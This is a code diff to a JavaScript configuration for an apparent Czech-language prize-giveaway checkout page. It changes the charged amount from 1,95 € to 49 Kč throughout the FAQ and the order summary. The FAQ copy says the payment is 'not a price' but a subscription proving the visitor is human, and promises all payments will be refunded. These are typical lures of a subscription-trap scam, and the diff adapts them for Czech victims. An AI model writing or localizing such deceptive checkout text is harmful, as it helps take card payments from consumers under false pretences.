@@ -180,8 +180,8 @@ const orderOriginParam = window.__origin_param;
       answer: "Nejprve musíte zadat svou doručovací adresu a kontaktní údaje, poté vás náš systém přesměruje. Pak musíte dokázat, že nejste robot, protože cena je nabízena pouze skutečným lidem.",
     },
     {
-      question: "Proč bych měl platit 1,95 € za cenu?",
-      answer: "1,95 € není cena - je to předplatné, které dokazuje, že jste skutečně člověk. Všechny platby budou vráceny po schválení.",
+      question: "Proč bych měl platit 49 Kč za cenu?",
+      answer: "49 Kč není cena - je to předplatné, které dokazuje, že jste skutečně člověk. Všechny platby budou vráceny po schválení.",
     },
     {
       question: "Nemohu použít svou kreditní kartu, transakce selhala?",
@@ -239,11 +239,11 @@ const orderOriginParam = window.__origin_param;
     main: {
       title: "Přehled objednávky",
       oldPrice: "",
-      newPrice: "1,95 €",
+      newPrice: "49 Kč",
       size: "Velikost",
       subTotal: {
         title: "Hodnota objednávky",
-        amount: "1,95 €",
+        amount: "49 Kč",
       },
       delivery: {
         title: "Doručení",
@@ -251,7 +251,7 @@ const orderOriginParam = window.__origin_param;
       },
       total: {
         title: "Celkem",
-        amount: "1,95 €",
+        amount: "49 Kč",
       },
       checkoutButton: "Zaplaťte svou objednávku",
     },
